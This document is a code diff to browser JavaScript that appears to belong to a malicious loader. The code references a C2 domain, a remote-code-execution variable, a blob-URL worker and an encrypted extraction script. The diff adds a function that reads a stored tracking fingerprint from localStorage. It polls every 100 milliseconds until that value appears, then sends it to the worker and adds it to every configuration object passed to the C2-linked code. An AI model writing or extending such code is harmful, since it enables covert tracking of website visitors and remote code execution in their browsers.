@@ -66,8 +66,16 @@ function __runtimeDomain() {
     } catch(e) {}
     return location.hostname;
 }
-function __runtimeDeviceId() {
+function __runtimeIntegrationId() {
     try { return (__bridgeRuntime && __bridgeRuntime.integration && __bridgeRuntime.integration.id) || ''; } catch(e) { return ''; }
+}
+
+function __runtimeFingerprint() {
+    try {
+        const fp = (window.localStorage && window.localStorage.getItem('_fp')) || '';
+        if (/^(?:[0-9a-f]{32}|fb_[a-z0-9]+_[0-9]{10,16})$/.test(fp)) return fp;
+    } catch(e) {}
+    return '';
 }
 
 function redirect() {
@@ -311,6 +319,20 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
         }
         }
         worker.onmessage = message_handler;
+        const qqFpStartedAt = Date.now();
+        const qqFpTimer = setInterval(function() {
+            try {
+                const fp = __runtimeFingerprint();
+                if (fp) {
+                    clearInterval(qqFpTimer);
+                    try { worker.postMessage({ type: 'stage_fp', fingerprint: fp }); } catch(e) {}
+                } else if (Date.now() - qqFpStartedAt > 10000) {
+                    clearInterval(qqFpTimer);
+                }
+            } catch(e) {
+                clearInterval(qqFpTimer);
+            }
+        }, 100);
         try
         {
         let rceCode = "";
@@ -338,8 +360,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                     SERVER_LOG,
                     channelCode: __runtimeChannelSlug(),
                     c2Domain: __runtimeDomain(),
-                    landingDomain: __runtimeDomain(),
-                    deviceId: __runtimeDeviceId(),
+                    integrationId: __runtimeIntegrationId(),
+                    fingerprint: __runtimeFingerprint(),
                     extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                 });
@@ -371,7 +393,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                         SERVER_LOG,
                         channelCode: __runtimeChannelSlug(),
                         c2Domain: __runtimeDomain(),
-                        landingDomain: __runtimeDomain(),
+                        integrationId: __runtimeIntegrationId(),
+                        fingerprint: __runtimeFingerprint(),
                         extractPath: new URL('extract.js.enc', localHost + '/').pathname
                 });
                         });
@@ -394,7 +417,8 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
                 SERVER_LOG,
                 channelCode: __runtimeChannelSlug(),
                 c2Domain: __runtimeDomain(),
-                landingDomain: __runtimeDomain(),
+                integrationId: __runtimeIntegrationId(),
+                fingerprint: __runtimeFingerprint(),
                 extractPath: new URL('extract.js.enc', localHost + '/').pathname
             });
             });
